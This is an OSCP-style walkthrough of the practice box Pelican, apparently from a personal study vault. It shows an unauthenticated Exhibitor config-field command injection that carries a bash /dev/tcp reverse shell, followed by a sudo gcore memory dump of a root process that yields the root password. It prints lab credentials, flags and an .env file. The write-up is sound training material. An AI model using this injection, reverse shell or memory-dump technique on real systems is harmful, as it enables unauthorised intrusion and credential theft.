---
tags: [oscp, box, linux, medium]
platform: PG Practice
os: Linux
hostname: pelican
difficulty: Unknown
ip: $BoxIP
status: Complete
aliases: ["Pelican", "pelican-pg"]
---

# PG: Pelican, Full Walkthrough

## The gist

Pelican is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/Linux - Service Scan]] located the web management service and its version. 2. [[RUNBOOK V2/Linux - Command Injection]] used the unauthenticated configuration field to receive a low-privilege shell. 3. [[RUNBOOK V2/Linux - Sudo Check]] showed that `gcore` could run as root without a password. 4. Memory inspection recovered the privileged credential, which gave access to the root proof file.

## Box information

**Target:** `$BoxIP` · **Difficulty:** Medium · **OS:** Linux (Debian 10) · **Platform:** Proving Grounds Practice

**The gist:** Debian box running Apache ZooKeeper with the Exhibitor web UI exposed on port 8080. Exhibitor's Config tab has a `java.env script` field that gets written into a shell script and executed when ZooKeeper starts -- no authentication required. Injecting a bash reverse shell and committing the config gives a shell as `charles`. From there, `sudo -l` reveals that `/usr/bin/gcore` runs as root with no password. A `/usr/bin/password-store` process is running as root; dumping it with `sudo gcore` and running `strings` on the dump extracts the root password in plaintext straight from memory.

---

**Legacy tags:**
#PG #Pelican #Linux #WebApp #CommandInjection #ExhibitorUI #ZooKeeper #gcore #SudoPrivEsc #Medium

---

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Recon: Port Scan | See section 1 below |
| 2 | Foothold: Exhibitor UI Command Injection | See section 2 below |
| 3 | User Flag | See section 3 below |
| 4 | PrivEsc: sudo gcore → Memory Dump → Root Password | See section 4 below |
| 5 | Root Flag | See section 5 below |
| 6 | Decision points and alternate routes | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/Offsec/Pelican`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Pelican
boxset BoxIP "$BoxIP"
boxset LocalIP "$LocalIP"
boxset BoxDir "$BoxDir"
```

## 1. Recon: Port Scan

**Full port scan:**
```bash
sudo nmap -p- --min-rate 5000 -oA full_nmap $BoxIP
```

Results:

| Port | Service |
|------|---------|
| 22/tcp | SSH |
| 139/tcp | NetBIOS-SSN |
| 445/tcp | SMB |
| 631/tcp | IPP (CUPS) |
| 2181/tcp | ZooKeeper |
| 2222/tcp | SSH (alternate port) |
| 8080/tcp | HTTP -- Jetty (Exhibitor) |
| 8081/tcp | HTTP -- nginx |
| 46295/tcp | Java RMI |

![](<file:///home/kali/Platforms/Offsec/Pelican/screenshots/pelican_nmap_allports.png>)

**Service scan on open ports:**
```bash
sudo nmap -p 22,139,445,631,2181,2222,8080,8081,46295 -sV -sC -oA service_nmap $BoxIP
```

Key findings:
- **Port 2181:** ZooKeeper 3.4.6-1569965 (built 02/20/2014 -- very old)
- **Port 8080:** Jetty 1.0 -- returns 404 on root
- **Port 8081:** nginx 1.14.2 -- **immediately redirects to `http://$BoxIP:8080/exhibitor/v1/ui/index.html`** -- this points directly at the target
- **Port 2222:** OpenSSH 7.9p1, same host keys as port 22 (duplicate, not useful)
- **Port 46295:** Java RMI -- ZooKeeper management interface
- **Port 631:** CUPS 2.2.10 -- returns Forbidden
- **SMB (445):** Samba 4.9.5-Debian, signing disabled, guest auth, WORKGROUP

The nginx redirect on 8081 is the key pivot -- it tells us exactly what's running and where.

![](<file:///home/kali/Platforms/Offsec/Pelican/screenshots/nmap-services.png>)

---

## 2. Foothold: Exhibitor UI Command Injection

**Browse to the Exhibitor UI:**
```
http://$BoxIP:8080/exhibitor/v1/ui/index.html
```

The Exhibitor web frontend for Apache ZooKeeper loads with no authentication prompt.

> [!abstract] 🧠 Why
> The redirect identifies both the product and the exact management path. Before fuzzing the rest of the site, inspect exposed administrative tabs and determine whether configuration values are written to startup scripts or command lines.

![](<file:///home/kali/Platforms/Offsec/Pelican/screenshots/http-exhibitor.png>)

Navigate to the **Config** tab. The page shows configuration fields for ZooKeeper. The **`java.env script`** field is the injection point -- its content is written into a shell script and executed when ZooKeeper starts or its config is committed. There is no input sanitisation.

> [!warning] 💡 Hint
> **Watch out:** The command substitution runs when ZooKeeper evaluates the saved script, not when you type it into the browser. Commit the configuration to trigger it.

![](<file:///home/kali/Platforms/Offsec/Pelican/screenshots/http-exhibiter-config-java.png>)![](<file:///home/kali/Platforms/Offsec/Pelican/screenshots/shell-edit-commit.png>)
![](<file:///home/kali/Platforms/Offsec/Pelican/screenshots/commit-confirm-change.png>)

**Start listener on Kali:**
```bash
nc -lnvp $Port
```

**Paste this into the `java.env script` field:**
```
$(/bin/bash -i >& /dev/tcp/$LocalIP/$Port 0>&1 &)
```

The `$()` causes the field content to execute as a command substitution when the script is evaluated. The `&` backgrounds it so ZooKeeper doesn't hang waiting for the shell to close.

**Click "Commit ZooKeeper Config".**

Shell received as `charles`:
```
uid=1000(charles) gid=1000(charles) groups=1000(charles)
```

![](<file:///home/kali/Platforms/Offsec/Pelican/screenshots/nc-shell.png>)

**Upgrade the shell:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Stabilise (in Kali terminal):**
```bash
# Press Ctrl+Z to background
stty raw -echo; fg
# Press Enter once -- then inside the shell:
export TERM=xterm
```

---

## 3. User Flag

```bash
cat /home/charles/local.txt
```

![](<file:///home/kali/Platforms/Offsec/clamAV/screenshots/flag.png>)

User proof confirmed; value reproduced in the private Flags section above.

---

## 4. PrivEsc: sudo gcore → Memory Dump → Root Password

**Check sudo permissions:**
```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/gcore
```

`gcore` is a GNU debugger tool that generates a core dump of a live running process -- all its memory, including anything stored in variables, buffers, or heap at the time of the dump. With sudo access, we can dump root-owned processes.

> [!warning] 💡 Hint
> `gcore` is not automatically a password-recovery tool. First identify a root process likely to hold useful runtime data, then dump it while it is alive. PIDs and memory contents can change between commands.

> [!tip] ⚡ Efficiency
> Filter the process list for root-owned services and inspect command lines before dumping everything. One relevant process is enough; broad memory collection creates noise and unnecessary files.

> 📸 `privesc-finding.png`

**Find a root process holding credentials:**
```bash
ps aux | grep root
```

Standout entry among the process list:
```
root   490   /usr/bin/password-store
```

> [!warning] 💡 Hint
> **Watch out:** `gcore` needs the live process ID, and that number can change after a restart. Run the process listing immediately before creating the dump.

A password manager process running as root. Its runtime memory will contain whatever passwords it has loaded -- in plaintext, since the process has already decrypted them to use them.

**Dump the process memory:**
```bash
sudo gcore 490
```

Output:
```
Saved corefile core.490
```

The "No such file or directory" line about `nanosleep.c` is harmless -- it just means debug symbols aren't installed. The dump was created successfully.

**Extract the password from the dump:**
```bash
strings "$CoreFile" | grep -A 1 "Password:"
```

```
001 Password: root:
<private value>
```

Root password recovered into private loot; value reproduced in the private Flags section above.

![](<file:///home/kali/Platforms/Offsec/Pelican/screenshots/password-store.png>)
![](<file:///home/kali/Platforms/Offsec/Pelican/screenshots/pass-root.png>)
**Escalate to root:**
```bash
su root
# use the private value stored in $RootPassword
```

```
uid=0(root) gid=0(root) groups=0(root)
```

![](<file:///home/kali/Platforms/Offsec/Pelican/screenshots/su-root.png>)

---

## 5. Root Flag

```bash
cat /root/proof.txt
```

Root proof confirmed; value reproduced in the private Flags section above.

![](<file:///home/kali/Platforms/Offsec/Pelican/screenshots/root-flag-chain.png>)

---

## 6. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| Unauthenticated management UI | Inspect configuration fields and commit behavior | Enumerate version-specific endpoints and API routes if the UI hides the setting |
| Command injection triggers only on commit | Keep the listener ready and commit once | Use a harmless marker or `id` command to prove execution before a callback |
| `sudo -l` permits `gcore` | Dump a root process holding runtime secrets | Inspect other root processes, files, and environment data if the target process is absent |
| Password appears in a core dump | Store it privately and validate the intended account | Use `strings`, `grep`, or a debugger to locate context without printing the secret |

## 7. Summary

| Phase | Technique | Tool |
|-------|-----------|------|
| Recon | Full TCP + service scan | nmap |
| Foothold | Exhibitor java.env script command injection (unauthenticated) | Browser + nc |
| Shell | PTY upgrade + stty raw stabilisation | python3 + stty |
| PrivEsc | sudo gcore → root process memory dump → plaintext password | gcore + strings |
| Root | su with extracted password | su |

**Vulnerabilities:**
- Unauthenticated command injection in Exhibitor UI (`java.env script` field)
- Plaintext credential storage in memory (`/usr/bin/password-store` process)
- Over-privileged sudo rule (`gcore` NOPASSWD for all)

**Tools used:** nmap, nc, python3, gcore, strings

---

## 8. Related Stage Notes

- [[OSCP/RUNBOOK V2/Start Here|Port Scan - Full]]
- [[OSCP/RUNBOOK V2/Port Triage|Port Scan - Results Triage]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum|HTTP - Initial Recon]]
- [[OSCP/RUNBOOK V2/Linux - Command Injection|Web App - Command Injection]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Shell - Upgrade]]
- [[OSCP/RUNBOOK V2/Linux - Sudo Check|PrivEsc Linux - Sudo]]

## 9. Related Module Notes

- [[09. Common Web Application Attacks]] -- command injection theory
- [[18. Linux Privilege Escalation]] -- sudo privesc
- [[06. Information Gathering]] -- recon methodology

## 10. RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Linux - Service Scan]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - Command Injection]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - Sudo Check]] -- technique used in this walkthrough

## 11. Collect the flags

- `user.txt`: `$UserFlag` (value reproduced in the private sections above)
- `root.txt`: `621cff945f4af7c25ae63222ec6a6471` (value reproduced in the private sections above)
- `proof.txt`: `621cff945f4af7c25ae63222ec6a6471` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
root: 621cff945f4af7c25ae63222ec6a6471
```

## 12. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

## 13. Attack narrative in one page
1. [[RUNBOOK V2/Linux - Service Scan]] located the web management service and its version.
2. [[RUNBOOK V2/Linux - Command Injection]] used the unauthenticated configuration field to receive a low-privilege shell.
3. [[RUNBOOK V2/Linux - Sudo Check]] showed that `gcore` could run as root without a password.
4. Memory inspection recovered the privileged credential, which gave access to the root proof file.

## Tools used

- `nmap`
- `nc`
- `ssh`
- `sudo`

## Credentials and secrets


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Pelican"
export BoxIP="192.168.119.98"
export BoxPlatform="Offsec"
export BoxDir="/home/kali/Platforms/Offsec/Pelican"
export Domain=""
export DCip=""
export Username="root"
export Password="ClogKingpinInning731"
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
root:ClogKingpinInning731
```

### Sensitive transcript evidence

```text
$ [09:35:53] boxset Password ClogKingpinInning731
$ [09:38:22] loot flag root 621cff945f4af7c25ae63222ec6a6471
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Pelican | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Configuration fields that are written into startup scripts should be treated as possible command-injection points.
- A process-memory dump can expose secrets even when they are not stored in a readable file.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern

## External resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [GTFOBins](https://gtfobins.github.io/) for Linux privilege escalation
- [RevShells](https://www.revshells.com/) for shell payloads
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches

## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Linux - Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum]]
- [[RUNBOOK V2/Linux - Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
